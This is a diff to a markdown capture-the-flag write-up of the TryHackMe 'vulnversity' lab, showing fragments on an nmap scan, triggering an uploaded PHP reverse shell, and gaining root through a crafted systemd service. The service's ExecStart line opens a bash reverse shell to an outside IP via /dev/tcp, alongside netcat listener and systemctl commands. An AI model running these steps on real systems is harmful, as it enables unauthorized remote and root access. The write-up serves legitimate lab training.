@@ -7,9 +7,9 @@
 ### Nmap Scan
 `nmap -sC -sV -T4 -p- -oN nmap.txt 10.10.118.67`
 ```
-# Nmap 7.93 scan initiated Thu Apr 11 21:27:32 2024 as: nmap -sC -sV -T4 -p- -oN nmap.txt 10.10.19.43
-Warning: 10.10.19.43 giving up on port because retransmission cap hit (6).
-Nmap scan report for 10.10.19.43
+# Nmap 7.93 scan initiated Thu Apr 11 21:27:32 2024 as: nmap -sC -sV -T4 -p- -oN nmap.txt 10.10.118.67
+Warning: 10.10.118.67 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.118.67
 Host is up (0.35s latency).
 Not shown: 64870 closed tcp ports (conn-refused), 659 filtered tcp ports (no-response)
 PORT     STATE SERVICE     VERSION
@@ -126,7 +126,7 @@ nc -lvnp 1337
 ### Execute the payload
 Browse
 ```
-http://MACHINE_IP:3333/internal/uploads/php-reverse-shell.phtml
+http://10.10.118.67:3333/internal/uploads/php-reverse-shell.phtml
 ```
 
 ### Gaining Access
@@ -187,13 +187,14 @@ Description=root
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'exec 5<>/dev/tcp/10.12.34.56/1337; bash >&5 2>&5 0<&5'
+User=root
+ExecStart=/bin/bash -c 'exec 5<>/dev/tcp/10.6.63.224/1338; bash >&5 2>&5 0<&5'
 
 [Install]
 WantedBy=multi-user.target
 ```
 
-Since we are creating `systemd` unit files under the directory that is not one of the standard directories of `systemd`, we have to create a symbolic link under /etc/systemd/system/ directory to make our unit file(`root.service`) available for management by systemctl by either running
+Since we are creating `systemd` unit files under the directory that is not one of the standard directories of `systemd`, we have to create a symbolic link under /etc/systemd/system/ directory to make our unit file(`root.service`) available for management by systemctl by either running.
 ```
 sudo systemctl link /tmp/root.service
 ```
@@ -205,22 +206,10 @@ Then we reload our configuration files for systemd to recognize our changes.
 ```
 sudo systemctl daemon-reload
 ```
-We then `enable` and `start` our service.
+
+We then open a new terminal and run `nc -lvnp 1338` to listen at port `1338` before `enable` and `start` our service.
 ```
 sudo systemctl enable root.service
 sudo systemctl start root.service
 ```
-
-![logo](https://github.com/fy0d-0r/thm-writeups/blob/main/vulnversity/images/mount-error.png)
-
-Now, we have encountered `Failed to start tmp-root.service.mount: Unit tmp-root.service.mount not found` and cannot start our `root.service` resulting in not running our script.
-
-This problem is because when we create a systemd unit file in the `/tmp` directory, systemd treats this file as a transient or temporary unit. Unit files in `/tmp` are typically considered temporary and are subject to specific behaviors and restrictions by systemd.
-
-Even if your unit.service file does not directly declare dependencies on mount units, the service itself might indirectly rely on filesystems or resources that are typically managed by mount units. In this case our service interacts with the file `/bin/bash` that reside on specific filesystems. Systemd can automatically infer dependencies on mount units that manage these filesystems to ensure they are mounted before the service starts.
-
-When we create a systemd service unit (let's say `unit.service`) that interacts with specific files or directories, systemd may implicitly infer dependencies on mount units (`.mount` files) that manage the filesystems where these files/directories reside.
-Systemd attempts to ensure that all necessary resources (including filesystems) are available before starting services. If our service requires access to files on certain filesystems, systemd will try to resolve dependencies by referencing the corresponding mount units.
-
-Moving our unit file(`root.service`) under different directory such as the home directory of the `bill` and repeating the above procedure will solve the problem, but we do not have write access under these directories.
-
+After the service has started and the payload is executed, we gain access to the `root` shell.
